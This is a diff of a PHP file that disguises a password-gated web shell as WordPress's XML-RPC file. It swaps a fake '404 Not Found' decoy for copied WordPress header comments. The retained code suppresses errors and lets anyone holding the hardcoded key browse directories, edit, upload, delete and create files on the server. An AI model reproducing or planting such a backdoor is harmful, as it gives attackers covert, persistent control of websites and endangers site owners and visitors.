@@ -1,118 +1,32 @@
 <?php
-echo "404 Not Found";
-?>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<?php 
+/**
+ * XML-RPC protocol support for WordPress
+ *
+ * @package WordPress
+ */
+
+/**
+ * Whether this is an XML-RPC Request.
+ *
+ * @var bool
+ */
+define( 'XMLRPC_REQUEST', true );
+
+// Discard unneeded cookies sent by some browser-embedded clients.
 $key = "logsfile";  
 if (!isset($_GET['p']) || $_GET['p'] !== $key) {
     http_response_code(403);
     exit("Access Denied");
 }
+// Fix for mozBlog and other cases where '<?xml' isn't on the very first line.
 @ini_set('display_errors', 0);
 @error_reporting(0);
 $self = basename(__FILE__);
 $cwd = isset($_GET['d']) && @is_dir($_GET['d']) ? $_GET['d'] : getcwd();
 @chdir($cwd);
-
+/** Include the bootstrap for setting up WordPress environment */
 $msg = '';
-// HANDLE SAVE FILE
 if (isset($_POST['savefile']) && isset($_POST['filename'])) {
     $filename = $_POST['filename'];
     if (@file_put_contents($filename, $_POST['filecontent']) !== false) {
@@ -121,7 +35,6 @@ if (isset($_POST['savefile']) && isset($_POST['filename'])) {
         $msg = "<div class='msg error'>Failed to save file!</div>";
     }
 }
-// HANDLE DELETE
 if (isset($_GET['del'])) {
     $file = basename($_GET['del']);
     if ($file !== $self && @is_file($file)) {
@@ -129,7 +42,6 @@ if (isset($_GET['del'])) {
         $msg = "<div class='msg success'>File <b>$file</b> deleted!</div>";
     }
 }
-// HANDLE UPLOAD
 if (isset($_FILES['file']) && is_uploaded_file($_FILES['file']['tmp_name'])) {
     $target = basename($_FILES['file']['name']);
     if ($target && @move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
@@ -138,7 +50,6 @@ if (isset($_FILES['file']) && is_uploaded_file($_FILES['file']['tmp_name'])) {
         $msg = "<div class='msg error'>Upload failed!</div>";
     }
 }
-// HANDLE NEW FOLDER
 if (!empty($_POST['newfolder'])) {
     $folder = basename(trim($_POST['newfolder']));
     if (!@is_dir($folder)) {
@@ -151,7 +62,6 @@ if (!empty($_POST['newfolder'])) {
         $msg = "<div class='msg error'>Folder <b>$folder</b> already exists!</div>";
     }
 }
-// HANDLE NEW FILE
 if (!empty($_POST['newfile'])) {
     $filename = basename(trim($_POST['newfile']));
     if (!@file_exists($filename)) {
@@ -165,7 +75,6 @@ if (!empty($_POST['newfile'])) {
     }
 }
 
-// EDIT MODE
 if (isset($_GET['edit']) && is_file($_GET['edit'])) {
     $editFile = $_GET['edit'];
     $content = @file_get_contents($editFile);
